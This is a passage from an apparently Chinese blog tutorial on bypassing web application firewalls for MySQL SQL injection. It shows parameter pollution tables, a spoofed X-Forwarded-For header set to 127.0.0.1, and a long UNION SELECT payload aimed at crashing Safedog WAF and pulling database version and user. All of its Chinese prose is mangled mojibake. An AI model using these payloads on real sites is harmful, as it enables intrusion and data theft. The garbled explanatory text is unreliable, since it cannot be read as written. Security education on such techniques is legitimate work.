Server      | Parameter Interpretation     | Example         |</span><br><span class="line">    +------------------------------------------------------------------+</span><br><span class="line">    | ASP.NET/IIS     | Concatenation by comma       | par1=val1,val2  |</span><br><span class="line">    | ASP/IIS         | Concatenation by comma       | par1=val1,val2  |</span><br><span class="line">    | PHP/Apache      | The last param is resulting  | par1=val2       |</span><br><span class="line">    | JSP/Tomcat      | The first param is resulting | par1=val1       |</span><br><span class="line">    | Perl/Apache     | The first param is resulting | par1=val1       |</span><br><span class="line">    | DBMan           | Concatenation by two tildes  | par1=val1~~val2 |</span><br><span class="line">    +------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><em>HTTP Parameter Contamination</em></strong></p>
<p>ä¸åŒçš„å®¹å™¨ä¹Ÿä¼šå°†æˆ‘ä»¬çš„å‚æ•°ä¸­å¸¦å…¥çš„ä¸€äº›ç‰¹æ®Šå­—ç¬¦è§£ææˆä¸åŒçš„ä¸œè¥¿ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">| Query String    |    Web Servers response / GET values            |</span><br><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">|                 | Apache/2.2.16, PHP/5.3.3     | IIS6/ASP         |</span><br><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">| ?test[1=2       | test_1=2                     | test[1=2         |</span><br><span class="line">| ?test=%         | test=%                       | test=            |</span><br><span class="line">| ?test%00=1      | test=1                       | test=1           |</span><br><span class="line">| ?test=1%001     | NULL                         | test=1           |</span><br><span class="line">| ?test+d=1+2     | test_d=1 2                   | test d=1 2       |</span><br><span class="line">+-------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h4 id="ç™½åå•"><a href="#ç™½åå•" class="headerlink" title="ç™½åå•"></a>ç™½åå•</h4><p>æœ‰äº›ç¨‹åºå¯¹æœ¬åœ° IP ä¸ä¼šè¿›è¡Œæ‹¦æˆªï¼Œå¦‚æœå®ƒçš„ host ä½¿ç”¨ <code>X-Forwarded-For</code> æ¥è·å–çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä¼ªé€ è¿™ä¸ªå¤´éƒ¨ä¿¡æ¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forward-For:127.0.0.1</span><br></pre></td></tr></table></figure>

<h4 id="ç¼“å†²æº¢å‡º"><a href="#ç¼“å†²æº¢å‡º" class="headerlink" title="ç¼“å†²æº¢å‡º"></a>ç¼“å†²æº¢å‡º</h4><p>æœ‰çš„ waf å¯¹äºæ•°æ®åŒ…çš„å¤„ç†æœ‰ä¸Šçº¿ï¼Œæ—©æœŸçš„ Safedog å¦‚æœæäº¤è¿‡é•¿çš„ URL å¯èƒ½ä¼šç›´æ¥å´©æºƒï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLecT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</span><br></pre></td></tr></table></figure>

<h4 id="ğŸŒ-å‚è€ƒ"><a href="#ğŸŒ-å‚è€ƒ" class="headerlink" title="ğŸŒ å‚è€ƒ"></a>ğŸŒ å‚è€ƒ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/papers/17934</span><br><span class="line">https://www.digitalmunition.me/2018/02/sql-injection-9-ways-bypass-web-application-firewall/</span><br></pre></td></tr></table></figure>

<p>æ€»è€Œè¨€ä¹‹ï¼ŒBYPASS ä¸èƒ½åªç®€å•å±€é™äºæŸä¸€ç§ï¼ŒåŒæ—¶å®ƒä¹Ÿæ˜¯ä¸€ä¸ªç»éªŒç§¯ç´¯çš„è¿‡ç¨‹ï¼Œéœ€è¦äº†è§£ mysql çš„è¯­æ³•ã€ç‰¹æ®Šç¬¦å·ã€ç‰¹æ®Šå†™æ³•ï¼Œfuzz waf èé”™çš„åœ°æ–¹ã€‚</p>
<p><em>SQLi_BYPASS_for_mysql</em> ç³»åˆ—è¿˜æ²¡æœ‰å®Œç»“ï¼ŒåæœŸè¿˜æœ‰ç»•é˜¿é‡Œäº‘ç›¾ã€äº‘é”ç­‰æµ‹è¯•ï¼Œä»¥åŠ <em>SQLi_BYPASS_for_mssql</em> ç³»åˆ—ã€‚</p>
<p>æœ¬ç³»åˆ—æ–‡ç« å¦‚æœ‰é”™è¯¯è¯·æŒ‡å‡ºï¼Œæ¬¢è¿äº¤æµã€‚</p>
<p><em>Hard work and no play makes Nick a dull boy.</em></p>
</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ckadu9ewg000swl90jt0yw9al" data-title="ğŸ’‰ SQLi_BYPASS_for_mysql Vol.4" data-url="http://www.naykcin.top/2020/01/09/sqlibypass4/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
var duoshuoQuery = {short_name: siteName};
(function() {
  var ds = document.createElement('script');
  ds.type = 'text/javascript';ds.async = true;
  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
  ds.charset = 'UTF-8';
  (document.getElementsByTagName('head')[0] 
  || document.getElementsByTagName('body')[0]).appendChild(ds);
})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2020/01/12/MS14-068/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2020/01/08/sqlibypass3/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">Â© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
window.onload = function () {
  wrap.className += ' done';
}</script></body></html>